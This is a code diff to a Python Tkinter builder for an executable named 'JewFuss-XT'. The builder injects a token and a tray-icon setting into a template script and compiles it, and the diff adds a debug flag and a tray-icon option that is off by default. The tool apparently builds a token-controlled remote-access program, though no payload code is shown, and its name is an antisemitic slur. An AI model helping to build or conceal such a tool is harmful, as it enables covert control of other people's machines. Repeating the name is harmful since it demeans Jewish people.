@@ -15,11 +15,14 @@ RECOMMENDED = (3, 11, 9)
 
 parser = argparse.ArgumentParser(add_help=False)
 parser.add_argument("--clean", action="store_true")
+parser.add_argument("--debug", action="store_true")
 args, _ = parser.parse_known_args()
 
 if args.clean:
     print('Compiling with "--clean"')
 
+if args.debug:
+    print('Launched with Debug mode enabled')
 
 class BuilderUI(tk.Tk):
     LocVer = ""
@@ -68,7 +71,8 @@ class BuilderUI(tk.Tk):
     def load_config(self):
         self.last_session = {
             "token": "",
-            "exe_filename": "JewFuss-XT.exe",
+            "exe_filename": "JewFuss-XT",
+            "use_tray_icon": False,
             "compile_installer": False,
             "icon_file": None,
         }
@@ -89,11 +93,13 @@ class BuilderUI(tk.Tk):
                     last = raw.get("last", {})
                     self.last_session["token"] = last.get("token", self.last_session["token"])
                     self.last_session["exe_filename"] = last.get("exe_filename", self.last_session["exe_filename"])
+                    self.last_session["use_tray_icon"] = bool(last.get("use_tray_icon", self.last_session["use_tray_icon"]))
                     self.last_session["compile_installer"] = last.get("compile_installer", self.last_session["compile_installer"])
                     self.last_session["icon_file"] = last.get("icon_file", self.last_session["icon_file"])
                 else:
                     self.last_session["token"] = raw.get("token", self.last_session["token"])
                     self.last_session["exe_filename"] = raw.get("exe_filename", self.last_session["exe_filename"])
+                    self.last_session["use_tray_icon"] = bool(raw.get("use_tray_icon", self.last_session["use_tray_icon"]))
                     self.last_session["compile_installer"] = raw.get("compile_installer", self.last_session["compile_installer"])
                     self.last_session["icon_file"] = raw.get("icon_file", self.last_session["icon_file"])
 
@@ -106,6 +112,7 @@ class BuilderUI(tk.Tk):
                     if (
                         preset.get("token") == self.last_session["token"]
                         and preset.get("exe_filename") == self.last_session["exe_filename"]
+                        and bool(preset.get("use_tray_icon", False)) == bool(self.last_session["use_tray_icon"])
                         and bool(preset.get("compile_installer")) == bool(self.last_session["compile_installer"])
                         and (preset.get("icon_file") or None) == (self.last_session.get("icon_file") or None)
                     ):
@@ -119,27 +126,28 @@ class BuilderUI(tk.Tk):
         try:
             last = {
                 "token": self.token_var.get().strip(),
-                "exe_filename": self.exe_var.get().strip() or "JewFuss-XT.exe",
+                "exe_filename": self.exe_var.get().strip() or "JewFuss-XT",
+                "use_tray_icon": bool(self.tray_var.get()),
                 "compile_installer": self.installer_var.get(),
                 "icon_file": self.icon_path if self.icon_path else None,
             }
         except Exception as e:
             print(f"Error collecting last session data for config: {e}")
             last = self.last_session
-
+    
         data = {
             "last": last,
             "presets": self.presets,
             "preset_order": self.preset_order,
         }
-
+    
         try:
             with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
                 json.dump(data, f, indent=2)
             print("Config saved")
         except Exception as e:
             print(f"Error saving config: {e}")
-
+    
         self.last_session = last
 
     def _bump_preset(self, token: str):
@@ -176,7 +184,8 @@ class BuilderUI(tk.Tk):
 
         preset = {
             "token": token,
-            "exe_filename": self.exe_var.get().strip() or "JewFuss-XT.exe",
+            "exe_filename": self.exe_var.get().strip() or "JewFuss-XT",
+            "use_tray_icon": bool(self.tray_var.get()),
             "compile_installer": self.installer_var.get(),
             "icon_file": icon_file,
         }
@@ -209,7 +218,8 @@ class BuilderUI(tk.Tk):
         self.preset_var.set("")
 
         self.token_var.set("")
-        self.exe_var.set("JewFuss-XT.exe")
+        self.exe_var.set("JewFuss-XT")
+        self.tray_var.set(False)
         self.installer_var.set(False)
         self.icon_path = None
         self.icon_btn.config(image="", text="Choose Icon")
@@ -227,6 +237,7 @@ class BuilderUI(tk.Tk):
 
         self.token_var.set(preset.get("token", token))
         self.exe_var.set(preset.get("exe_filename", "JewFuss-XT.exe"))
+        self.tray_var.set(bool(preset.get("use_tray_icon", False)))
         self.installer_var.set(bool(preset.get("compile_installer", False)))
 
         icon_file = preset.get("icon_file")
@@ -305,16 +316,24 @@ class BuilderUI(tk.Tk):
             self.show_icon(icon_to_load)
             print(f"Loaded icon from {icon_to_load}")
 
+        self.tray_var = tk.BooleanVar(value=bool(self.last_session.get("use_tray_icon", False)))
+        self.cb_tray = ttk.Checkbutton(
+            frm,
+            text="Enable tray icon?",
+            variable=self.tray_var,
+        )
+        self.cb_tray.grid(row=8, column=0, sticky="w", pady=(5, 0))
+
         self.installer_var = tk.BooleanVar(value=self.last_session.get("compile_installer", False))
         self.cb_installer = ttk.Checkbutton(
             frm,
             text="Compile installer?",
             variable=self.installer_var,
         )
-        self.cb_installer.grid(row=8, column=0, sticky="w", pady=(5, 10))
+        self.cb_installer.grid(row=9, column=0, sticky="w", pady=(5, 10))
 
         self.build_btn = ttk.Button(frm, text="Compile", command=self.build)
-        self.build_btn.grid(row=9, column=0, sticky="w")
+        self.build_btn.grid(row=10, column=0, sticky="w")
 
         self.update_build_state()
 
@@ -390,8 +409,11 @@ class BuilderUI(tk.Tk):
             self.build_btn.state(["disabled"])
 
     def disable_inputs(self):
-        for w in (self.ent_token, self.ent_exe, self.icon_btn, self.build_btn, self.cb_installer,
-                  self.preset_combo, self.btn_preset_save, self.btn_preset_delete):
+        for w in (
+            self.ent_token, self.ent_exe, self.icon_btn, self.build_btn,
+            self.cb_tray, self.cb_installer,
+            self.preset_combo, self.btn_preset_save, self.btn_preset_delete
+        ):
             try:
                 w.state(["disabled"])
             except Exception:
@@ -401,8 +423,11 @@ class BuilderUI(tk.Tk):
                     print(f"Error disabling widget {w}: {e}")
 
     def enable_inputs(self):
-        for w in (self.ent_token, self.ent_exe, self.icon_btn, self.build_btn, self.cb_installer,
-                  self.preset_combo, self.btn_preset_save, self.btn_preset_delete):
+        for w in (
+            self.ent_token, self.ent_exe, self.icon_btn, self.build_btn,
+            self.cb_tray, self.cb_installer,
+            self.preset_combo, self.btn_preset_save, self.btn_preset_delete
+        ):
             try:
                 w.state(["!disabled"])
             except Exception:
@@ -492,6 +517,17 @@ class BuilderUI(tk.Tk):
         if not replaced_token:
             print("TOKEN marker ' - 23r98h' not found in template")
 
+        replaced_tray = False
+        tray_value = "True" if self.tray_var.get() else "False"
+        for i, l in enumerate(lines):
+            if " - 28f93g" in l:
+                lines[i] = f"USE_TRAY_ICON = {tray_value}"
+                replaced_tray = True
+                break
+
+        if not replaced_tray:
+            print("USE_TRAY_ICON marker ' - 28f93g' not found in template")
+
         tmpd = tempfile.mkdtemp()
         tf = os.path.join(tmpd, 'temp.py')
         try:
@@ -502,7 +538,11 @@ class BuilderUI(tk.Tk):
             shutil.rmtree(tmpd, ignore_errors=True)
             self.after(0, self.enable_inputs)
             return
-
+        
+        if args.debug:
+            print("[Debug]: Keeping uncompiled script in builds folder")
+            shutil.copyfile(tf, os.path.join(OUTPUT_DIR, "unpackaged-latest.py"))
+        
         out_name = self.exe_var.get().strip().removesuffix(".exe")
         out_name = out_name or "JewFuss-XT"
         out_file = out_name + ".exe" if not out_name.endswith('.exe') else out_name
